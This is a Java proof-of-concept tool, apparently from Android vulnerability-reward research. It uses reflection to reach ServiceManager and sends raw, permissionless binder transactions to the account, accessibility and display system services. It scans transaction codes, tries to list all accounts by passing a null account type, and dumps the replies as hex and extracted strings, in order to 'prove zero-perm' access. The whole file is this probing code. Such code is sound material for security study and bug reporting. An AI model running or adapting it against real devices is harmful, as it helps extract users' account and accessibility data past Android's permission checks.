import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class ServiceDataDump {
    static Method getService;

    public static void main(String[] args) throws Exception {
        Class<?> sm = Class.forName("android.os.ServiceManager");
        getService = sm.getMethod("getService", String.class);

        System.out.println("UID: " + android.os.Process.myUid());

        dumpAccountService();
        dumpAccessibilityService();
        dumpDisplayService();

        // Also try running as our app's UID to prove zero-perm
        System.out.println("\n=== Package UID check ===");
        try {
            Process p = Runtime.getRuntime().exec(new String[]{
                "cmd", "package", "list", "packages", "-U", "com.vrp.appops"
            });
            java.io.BufferedReader br = new java.io.BufferedReader(
                new java.io.InputStreamReader(p.getInputStream()));
            String line;
            while ((line = br.readLine()) != null) {
                System.out.println("  " + line);
            }
        } catch (Exception e) {
            System.out.println("  " + e.getMessage());
        }
    }

    static IBinder svc(String name) throws Exception {
        return (IBinder) getService.invoke(null, name);
    }

    static void dumpAccountService() throws Exception {
        System.out.println("\n=== Account Service (txn 3) ===");
        IBinder b = svc("account");
        if (b == null) { System.out.println("not found"); return; }
        String iface = b.getInterfaceDescriptor();
        System.out.println("Interface: " + iface);

        // Scan txns 1-10 with empty args
        for (int txn = 1; txn <= 15; txn++) {
            Parcel d = Parcel.obtain();
            Parcel r = Parcel.obtain();
            try {
                d.writeInterfaceToken(iface);
                b.transact(txn, d, r, 0);
                r.setDataPosition(0);
                int ex = r.readInt();
                int avail = r.dataAvail();
                if (ex == 0 && avail > 4) {
                    System.out.println("  txn" + txn + ": " + avail + " bytes");
                    // Dump raw hex for first 256 bytes
                    byte[] raw = new byte[Math.min(avail, 256)];
                    r.readByteArray(raw);
                    dumpHex(raw, "    ");
                } else if (ex != 0) {
                    String msg = r.readString();
                    if (msg != null && msg.length() > 80) msg = msg.substring(0, 80);
                    if (msg != null && !msg.contains("not fully consumed")) {
                        System.out.println("  txn" + txn + ": ex=" + ex + " " + msg);
                    }
                }
            } catch (Exception e) {
                // skip
            } finally {
                d.recycle();
                r.recycle();
            }
        }

        // Try getAccounts with type=null (should return all accounts)
        System.out.println("\n  --- getAccounts attempts ---");
        for (int txn = 3; txn <= 8; txn++) {
            Parcel d = Parcel.obtain();
            Parcel r = Parcel.obtain();
            try {
                d.writeInterfaceToken(iface);
                d.writeString(null); // accountType = null (all)
                d.writeString("com.vrp.appops"); // opPackageName
                b.transact(txn, d, r, 0);
                r.setDataPosition(0);
                int ex = r.readInt();
                int avail = r.dataAvail();
                if (ex == 0 && avail > 4) {
                    System.out.println("  txn" + txn + " (null type): " + avail + " bytes");
                    byte[] raw = new byte[Math.min(avail, 512)];
                    r.readByteArray(raw);
                    dumpHex(raw, "    ");
                    dumpStrings(raw, "    ");
                }
            } catch (Exception e) {
                // skip
            } finally {
                d.recycle();
                r.recycle();
            }
        }
    }

    static void dumpAccessibilityService() throws Exception {
        System.out.println("\n=== Accessibility Service ===");
        IBinder b = svc("accessibility");
        if (b == null) { System.out.println("not found"); return; }
        String iface = b.getInterfaceDescriptor();
        System.out.println("Interface: " + iface);

        for (int txn = 1; txn <= 10; txn++) {
            Parcel d = Parcel.obtain();
            Parcel r = Parcel.obtain();
            try {
                d.writeInterfaceToken(iface);
                b.transact(txn, d, r, 0);
                r.setDataPosition(0);
                int ex = r.readInt();
                int avail = r.dataAvail();
                if (ex == 0 && avail > 20) {
                    System.out.println("  txn" + txn + ": " + avail + " bytes");
                    byte[] raw = new byte[Math.min(avail, 512)];
                    r.readByteArray(raw);
                    dumpStrings(raw, "    ");
                } else if (ex != 0) {
                    String msg = r.readString();
                    if (msg != null && msg.contains("Security") || (msg != null && msg.contains("permission"))) {
                        System.out.println("  txn" + txn + ": SECURITY: " + msg);
                    }
                }
            } catch (Exception e) {
                // skip
            } finally {
                d.recycle();
                r.recycle();
            }
        }
    }

    static void dumpDisplayService() throws Exception {
        System.out.println("\n=== Display Service ===");
        IBinder b = svc("display");
        if (b == null) { System.out.println("not found"); return; }
        String iface = b.getInterfaceDescriptor();

        for (int txn = 1; txn <= 5; txn++) {
            Parcel d = Parcel.obtain();
            Parcel r = Parcel.obtain();
            try {
                d.writeInterfaceToken(iface);
                b.transact(txn, d, r, 0);
                r.setDataPosition(0);
                int ex = r.readInt();
                int avail = r.dataAvail();
                if (ex == 0 && avail > 20) {
                    System.out.println("  txn" + txn + ": " + avail + " bytes");
                    byte[] raw = new byte[Math.min(avail, 256)];
                    r.readByteArray(raw);
                    dumpStrings(raw, "    ");
                }
            } catch (Exception e) {
                // skip
            } finally {
                d.recycle();
                r.recycle();
            }
        }
    }

    static void dumpHex(byte[] data, String prefix) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < data.length; i++) {
            if (i % 32 == 0) {
                if (i > 0) System.out.println(prefix + sb.toString());
                sb.setLength(0);
            }
            sb.append(String.format("%02x ", data[i] & 0xff));
        }
        if (sb.length() > 0) System.out.println(prefix + sb.toString());
    }

    static void dumpStrings(byte[] data, String prefix) {
        // Try to extract readable UTF-16LE strings
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < data.length - 1; i += 2) {
            char c = (char)((data[i] & 0xff) | ((data[i+1] & 0xff) << 8));
            if (c >= 32 && c < 127) {
                sb.append(c);
            } else if (sb.length() > 3) {
                System.out.println(prefix + "STR: \"" + sb.toString() + "\"");
                sb.setLength(0);
            } else {
                sb.setLength(0);
            }
        }
        if (sb.length() > 3) {
            System.out.println(prefix + "STR: \"" + sb.toString() + "\"");
        }
    }
}
